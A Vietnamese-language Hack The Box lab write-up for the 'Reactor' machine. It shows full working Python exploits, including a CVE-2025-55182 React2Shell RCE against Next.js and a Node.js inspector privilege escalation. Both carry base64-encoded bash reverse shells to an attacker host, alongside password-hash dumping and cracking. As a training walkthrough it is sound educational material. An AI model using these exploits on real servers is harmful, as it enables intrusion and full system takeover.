---
description: writeup
coverY: 0
---

# Reactor

## HTB: Reactor

**Author:** duongpahm&#x20;

**IP:** `10.129.71.45`

***

### Summary

**Reactor** là một máy chủ Linux mức độ khó (Hard) yêu cầu kỹ năng nghiên cứu các lỗ hổng mới nhất (0-day/n-day). Quá trình bắt đầu bằng việc nhận diện một ứng dụng **Next.js** chạy trên cổng 3000. Thông qua việc phân tích phiên bản và công nghệ, tôi phát hiện ra máy chủ dính lỗ hổng **CVE-2025-55182 (React2Shell)** trong giao thức React Server Components (RSC), cho phép thực thi mã từ xa (RCE). Sau khi có được quyền truy cập ban đầu dưới tư cách user `node`, tôi tìm thấy một file database SQLite chứa hash mật khẩu của user `engineer`. Sau khi bẻ khóa hash này, tôi đăng nhập qua SSH và phát hiện một tiến trình Node.js chạy với quyền **root** đang mở cổng gỡ lỗi (Inspector). Bằng cách kết nối vào cổng này qua WebSocket, tôi đã thực thi mã với đặc quyền cao nhất và chiếm quyền điều khiển hoàn toàn hệ thống.

***

### Recon

#### Scanning

Tôi bắt đầu bằng việc quét toàn bộ các cổng bằng **RustScan**:

```bash
duong@kali:~$ rustscan -a 10.129.71.45 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/duong/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.71.45:22
Open 10.129.71.45:3000
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 20:58 -0400
Initiating Ping Scan at 20:58
Scanning 10.129.71.45 [4 ports]
Completed Ping Scan at 20:58, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:58
Completed Parallel DNS resolution of 1 host. at 20:58, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:58
Scanning 10.129.71.45 [2 ports]
Discovered open port 22/tcp on 10.129.71.45
Discovered open port 3000/tcp on 10.129.71.45
Completed SYN Stealth Scan at 20:58, 0.05s elapsed (2 total ports)
Nmap scan report for 10.129.71.45
Host is up, received echo-reply ttl 63 (0.050s latency).
Scanned at 2026-05-25 20:58:02 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Kết quả cho thấy hai cổng mở: **22 (SSH)** và **3000 (HTTP)**. Tôi tiếp tục quét chi tiết bằng **Nmap** với các script mặc định và kiểm tra phiên bản:

```bash
duong@kali:~$ sudo nmap -sC -sV -vv -T4 10.129.71.45
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 00:33 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating SYN Stealth Scan at 00:33
Scanning 10.129.71.45 [1000 ports]
Discovered open port 22/tcp on 10.129.71.45
Discovered open port 3000/tcp on 10.129.71.45
Completed SYN Stealth Scan at 00:33, 0.87s elapsed (1000 total ports)
Initiating Service scan at 00:33
Scanning 2 services on 10.129.71.45
Completed Service scan at 00:33, 14.13s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.71.45.
Nmap scan report for 10.129.71.45
Host is up, received reset ttl 63 (0.057s latency).
Scanned at 2026-05-26 00:33:29 EDT for 16s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Tue, 26 May 2026 04:33:41 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head>...
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Tue, 26 May 2026 04:33:41 GMT
|     Connection: close
|_    Connection: close
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.048KB)
```

Dựa trên banner `X-Powered-By: Next.js` và các header `Vary: RSC`, tôi xác định đây là một ứng dụng **Next.js** hiện đại sử dụng **React Server Components**.

#### Vulnerability Scanning

Tôi sử dụng **Nuclei** để kiểm tra các lỗ hổng web:

```bash
duong@kali:~$ nuclei -u http://10.129.71.45:3000/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.7.1

                projectdiscovery.io

[INF] Current nuclei version: v3.7.1 (outdated)
[INF] Current nuclei-templates version: v10.4.3 (latest)
...
[CVE-2025-55182] [http] [critical] http://10.129.71.45:3000/
[dameng-detect] [javascript] [info] 10.129.71.45:3000
[snmpv3-detect] [javascript] [info] 10.129.71.45:3000 ["Enterprise: unknown"]
[options-method] [http] [info] http://10.129.71.45:3000/ ["HEAD","GET"]
[tech-detect:next.js] [http] [info] http://10.129.71.45:3000/
[INF] Scan completed in 3m. 5 matches found.
```

**Nuclei** xác nhận máy chủ dính lỗi **CVE-2025-55182**, một lỗ hổng RCE cực kỳ mới trong cách Next.js xử lý các luồng dữ liệu RSC.

***

### Foothold

#### Exploit CVE-2025-55182 (React2Shell)

Lỗ hổng này cho phép kẻ tấn công gửi một payload RSC Flight được chế tạo đặc biệt thông qua header `Next-Action`. Khi server giải mã payload này, nó sẽ bị dẫn dụ vào một chuỗi "prototype pollution" dẫn đến việc thực thi mã JavaScript tùy ý.

Tôi sử dụng script Python sau để lấy **Reverse Shell** qua kết nối `netcat`:

```python
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json
import base64

# 1. Cấu hình các thông số mặc định 
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://10.129.71.45:3000"
LHOST = "10.10.14.4"
LPORT = "4444"

# 2. Tạo câu lệnh Reverse Shell tiêu chuẩn và mã hóa sang Base64
raw_payload = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
b64_payload = base64.b64encode(raw_payload.encode()).decode()

# Lệnh hoàn chỉnh ép máy chủ giải mã Base64 và thực thi ngầm ở background (&)
EXECUTABLE = f"echo {b64_payload} | base64 -d | bash &"

print(f"[*] Target URL: {BASE_URL}")
print(f"[*] Listening on: {LHOST}:{LPORT}")
print(f"[*] Encoded Payload: {EXECUTABLE}")

# 3. Cấu trúc gói tin khai thác CVE-2025-55182
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        # Sử dụng hàm .exec() bất đồng bộ để không làm treo hoặc crash tiến trình Node.js
        "_prefix": "process.mainModule.require('child_process').exec('" + EXECUTABLE + "');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

# 4. Thiết lập Header. 
headers = {
    "Next-Action": "x" 
}

print("[*] Sending exploit payload...")
try:
    res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
    print(f"[+] Server Response Status: {res.status_code}")
except requests.exceptions.Timeout:
    print("[+] Request timed out! (Đây thường là dấu hiệu tốt cho thấy lệnh đang được thực thi hoặc giữ kết nối)")
except Exception as e:
    print(f"[-] Error: {e}")
```

Thiết lập listener `nc -lvnp 4444` và chạy script:

```bash
duong@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.71.45] 60540
bash: cannot set terminal process group (1411): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$ id
uid=999(node) gid=988(node) groups=988(node)
```

Tôi đã có shell với quyền user **node**.

***

### Lateral Movement

#### Extracting Information from Database

Từ shell của user `node`, tôi kiểm tra thư mục hiện tại `/opt/reactor-app` và nội dung file `package.json` để xác thực phiên bản thư viện:

```bash
node@reactor:/opt/reactor-app$ ls -la
total 76
drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   276 Dec 28 21:05 .env
drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db

node@reactor:/opt/reactor-app$ cat package.json
{
  "name": "reactor-app",
  "version": "3.2.1",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start -p 3000"
  },
  "dependencies": {
    "next": "15.0.3",
    "react": "19.0.0",
    "react-dom": "19.0.0"
  }
}
```

Vì hệ thống có cài đặt sẵn `sqlite3`, tôi truy vấn trực tiếp vào database `reactor.db` để lấy thông tin bảng `users`:

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT * FROM users;"
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

#### Password Cracking

Tôi lưu cả hai hash tìm được vào file `hash.txt` và sử dụng **John the Ripper** cùng wordlist `rockyou.txt` để bẻ khóa:

```bash
duong@kali:~$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
reactor1         (engineer)     
1g 0:00:00:00 DONE (2026-05-26 00:09) 1.886g/s 27062Kp/s 27062Kc/s 27704KC/s !IMABITCH!..*7¡Vamos!
```

Mật khẩu của `engineer` là **`reactor1`**. Tôi tiến hành đăng nhập qua SSH:

```bash
duong@kali:~$ ssh engineer@10.129.71.45
engineer@10.129.71.45's password: reactor1
engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

***

### Privilege Escalation

#### Enumeration

Kiểm tra các cổng đang lắng nghe và tiến trình liên quan:

```bash
engineer@reactor:~$ netstat -tulnp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
...

engineer@reactor:~$ ps aux | grep node
node        1409 11.2  4.0 11837748 161052 ?     Ssl  May25  36:08 next-server (v15.0.3)
root        1411  0.0  1.2 1066772 49764 ?       Ssl  May25   0:02 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
...
```

Tiến trình **Node.js** (PID 1411) đang chạy với quyền **root** và bật tính năng **Inspector** (gỡ lỗi) trên cổng **9229** tại giao diện localhost. Điều này cho phép thực thi mã JavaScript tùy ý dưới danh nghĩa của root.

#### Exploit Node.js Inspector

Tôi sử dụng script `pwn_root.py` để kết nối vào WebSocket của debugger (port 9229) và thực thi mã JavaScript tùy ý. Để có được quyền điều khiển hoàn toàn (**Full Root Shell**), tôi sử dụng một payload reverse shell được mã hóa Base64 để tránh lỗi ký tự đặc biệt:

```python
import socket, json, urllib.request, base64, os

# 1. Lấy UUID của phiên debug qua API nội bộ
with urllib.request.urlopen("http://127.0.0.1:9229/json/list") as r:
    uuid = json.loads(r.read().decode())[0]['id']

# Hàm tạo frame WebSocket có masking (bắt buộc theo chuẩn RFC 6455)
def create_frame(message):
    message_bytes = message.encode()
    length = len(message_bytes)
    mask = os.urandom(4)
    frame = bytearray([0x81, 0x80 | (length if length <= 125 else 126)])
    if length > 125: frame.extend(length.to_bytes(2, 'big'))
    frame.extend(mask)
    frame.extend(bytearray(b ^ mask[i % 4] for i, b in enumerate(message_bytes)))
    return frame

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9229))

# Gửi HTTP Upgrade handshake
key = base64.b64encode(os.urandom(16)).decode()
handshake = (f"GET /{uuid} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
s.send(handshake.encode())
s.recv(1024)

# Payload Reverse Shell (Base64 encoded: bash -i >& /dev/tcp/10.10.14.4/4445 0>&1)
cmd_b64 = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDUgMD4mMQo="
payload = {
    "id": 1, 
    "method": "Runtime.evaluate", 
    "params": {
        "expression": f"process.mainModule.require('child_process').exec('echo {cmd_b64} | base64 -d | bash')",
        "returnByValue": True
    }
}
s.send(create_frame(json.dumps(payload)))
s.close()
```

Tôi thiết lập listener trên máy tấn công:

```bash
duong@kali:~$ nc -lvnp 4445
```

Sau khi chạy script trên máy mục tiêu, tôi nhận được kết nối ngược về với quyền **root**:

```bash
listening on [any] 4445 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.71.45] 55176
bash: cannot set terminal process group (1411): Inappropriate ioctl for device
bash: no job control in this shell

root@reactor:/# id
uid=0(root) gid=0(root) groups=0(root)
```

###
